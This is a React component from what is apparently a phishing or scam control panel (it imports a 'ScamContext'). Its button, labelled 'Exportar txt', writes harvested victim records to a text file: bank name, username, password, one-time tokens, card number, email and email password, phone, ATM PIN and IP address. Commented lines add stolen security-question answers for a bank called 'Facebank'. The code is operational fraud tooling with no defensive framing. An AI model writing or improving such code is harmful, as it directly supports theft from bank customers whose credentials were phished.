import { saveAs } from 'file-saver';
import React, { useContext } from 'react'
import { ScamContext } from '../../context/ScamContext';

export const BtnDownloadTxt = ({active}) => {

    const {users, selected, filteredType} = useContext(ScamContext);
    
    const downloadUsers = () => {
        if(users.length == 0) return
        
        const blob = new Blob(users.map(e => {
            return `==========
= banco: ${e.name}
= usuario: ${e.username}
= clave: ${e.password}
${e.token1 != undefined && (filteredType.includes('Token1') || filteredType.length ==   1) ? `= token1: ${e.token1}\n` : ''}${e.token2 != undefined && (filteredType.includes('Token2') || filteredType.length == 1) ? `= token2: ${e.token2}\n` : ''}${e.tarjeta != undefined && (filteredType.includes('Tarjeta') || filteredType.length == 1) ? `= tarjeta: ${e.tarjeta}\n` : ''}${e.correo != undefined && (filteredType.includes('Correo') || filteredType.length == 1) ? `= correo: ${e.correo}\n` : ''}${e.claveCorreo != undefined && (filteredType.includes('Clave del correo') || filteredType.length == 1) ? `= clave correo: ${e.claveCorreo}\n` : '' }${e.celular != undefined && (filteredType.includes('Celular') || filteredType.length == 1) ? `= cel: ${e.celular}\n` : '' }${e.atmPassword != undefined && (filteredType.includes('Clave ATM') || filteredType.length == 1) ? `= clave ATM: ${e.atmPassword}\n` : '' }= ip: ${e.ip}
==========

`
}), { type: 'type/plain;charset=utf-8' });
        
        saveAs(blob, `${selected}-${filteredType}-${users.length}.txt`)

    }

    return (
        <div className='flex flex-col'>
            <button 
                onClick={() => downloadUsers()}
        
        className={ 'px-3 text-left rounded py-1 hover:bg-blue-400 hover:text-white' }
            >Exportar txt</button>
        </div>
    )
}
// =faceBankAlias: ${e.faceBankAlias}
// =facebankPreguntaPasatiempoFav: ${e.facebankPreguntaPasatiempoFav}
// =facebankPreguntaSitioVacacionesFav: ${e.facebankPreguntaSitioVacacionesFav}
// =facebankPreguntaModeloPrimerVehiculo: ${e.facebankPreguntaModeloPrimerVehiculo}
// =facebankPreguntaSegundoNombreDelPadre: ${e.facebankPreguntaSegundoNombreDelPadre}
// =facebankPreguntaComidaFav: ${e.facebankPreguntaComidaFav}